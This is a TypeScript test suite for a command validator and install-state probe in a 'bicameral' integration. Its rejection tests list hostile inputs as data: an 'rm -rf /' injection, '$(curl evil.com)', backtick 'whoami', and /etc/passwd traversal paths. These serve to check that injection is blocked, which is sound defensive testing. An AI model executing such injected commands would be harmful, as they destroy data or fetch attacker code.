// Functional tests for install-detector. SG-035: each test invokes the unit
// and asserts on its output, not on artifact existence.

import { strict as assert } from 'assert';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import {
  isSafeBicameralCommand,
  probeInstallState,
} from '../../../integrations/bicameral/install-detector';

suite('integrations/bicameral install-detector', () => {
  suite('isSafeBicameralCommand', () => {
    test('accepts bare executable name "bicameral-mcp"', () => {
      assert.equal(isSafeBicameralCommand('bicameral-mcp'), true);
    });

    test('accepts alphanumerics + dot + dash + underscore', () => {
      assert.equal(isSafeBicameralCommand('bicameral_mcp.v2'), true);
    });

    test('rejects empty string', () => {
      assert.equal(isSafeBicameralCommand(''), false);
    });

    test('rejects shell metacharacters', () => {
      assert.equal(isSafeBicameralCommand('bicameral-mcp; rm -rf /'), false);
      assert.equal(isSafeBicameralCommand('bicameral-mcp && evil'), false);
      assert.equal(isSafeBicameralCommand('$(curl evil.com)'), false);
      assert.equal(isSafeBicameralCommand('`whoami`'), false);
    });

    test('rejects path traversal in absolute paths', () => {
      const home = os.homedir();
      assert.equal(isSafeBicameralCommand(`${home}/../../etc/passwd`), false);
    });

    test('rejects relative paths', () => {
      assert.equal(isSafeBicameralCommand('./bicameral-mcp'), false);
      assert.equal(isSafeBicameralCommand('../bin/bicameral-mcp'), false);
    });

    test('rejects absolute paths outside home directory', () => {
      assert.equal(isSafeBicameralCommand('/etc/passwd'), false);
      assert.equal(isSafeBicameralCommand('/usr/bin/evil'), false);
    });

    test('accepts absolute path under home directory', () => {
      const home = os.homedir();
      if (!home) {
        assert.ok(true, 'no home dir on this platform');
        return;
      }
      const fakePath = path.join(home, '.local', 'bin', 'bicameral-mcp');
      assert.equal(isSafeBicameralCommand(fakePath), true);
    });

    test('rejects non-string input', () => {
      assert.equal(isSafeBicameralCommand(null as unknown as string), false);
      assert.equal(isSafeBicameralCommand(undefined as unknown as string), false);
      assert.equal(isSafeBicameralCommand(123 as unknown as string), false);
    });

    test('rejects overlong input', () => {
      const long = 'a'.repeat(2000);
      assert.equal(isSafeBicameralCommand(long), false);
    });
  });

  suite('probeInstallState', () => {
    function mkTempWs(prefix: string): string {
      return fs.mkdtempSync(path.join(os.tmpdir(), prefix));
    }

    test('returns not-installed when command is not on PATH (ENOENT)', async () => {
      const ws = mkTempWs('fs-bic-1-');
      try {
        const result = await probeInstallState({
          command: 'bicameral-mcp-definitely-not-installed-xyz',
          workspaceRoot: ws,
          timeoutMs: 5000,
        });
        assert.equal(result.state, 'not-installed');
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });

    test('returns not-installed when command fails validation (shell metacharacter)', async () => {
      const ws = mkTempWs('fs-bic-2-');
      try {
        const result = await probeInstallState({
          command: 'bicameral-mcp; pwd',
          workspaceRoot: ws,
        });
        assert.equal(result.state, 'not-installed');
        assert.equal(result.version, undefined);
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });

    test('returns installed-not-configured when CLI runs but .bicameral/config.yaml absent', async () => {
      const ws = mkTempWs('fs-bic-3-');
      try {
        // Use node --version as a stand-in CLI that we know exits 0 and emits a version string.
        const result = await probeInstallState({
          command: 'node',
          workspaceRoot: ws,
        });
        assert.equal(result.state, 'installed-not-configured');
        assert.match(result.version || '', /^\d+\.\d+\.\d+/);
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });

    test('returns configured-not-running when config.yaml exists', async () => {
      const ws = mkTempWs('fs-bic-4-');
      try {
        fs.mkdirSync(path.join(ws, '.bicameral'), { recursive: true });
        fs.writeFileSync(path.join(ws, '.bicameral', 'config.yaml'), 'mode: solo\n', 'utf8');
        const result = await probeInstallState({
          command: 'node',
          workspaceRoot: ws,
        });
        assert.equal(result.state, 'configured-not-running');
        assert.equal(result.configPath, path.join(ws, '.bicameral', 'config.yaml'));
      } finally {
        fs.rmSync(ws, { recursive: true, force: true });
      }
    });
  });
});
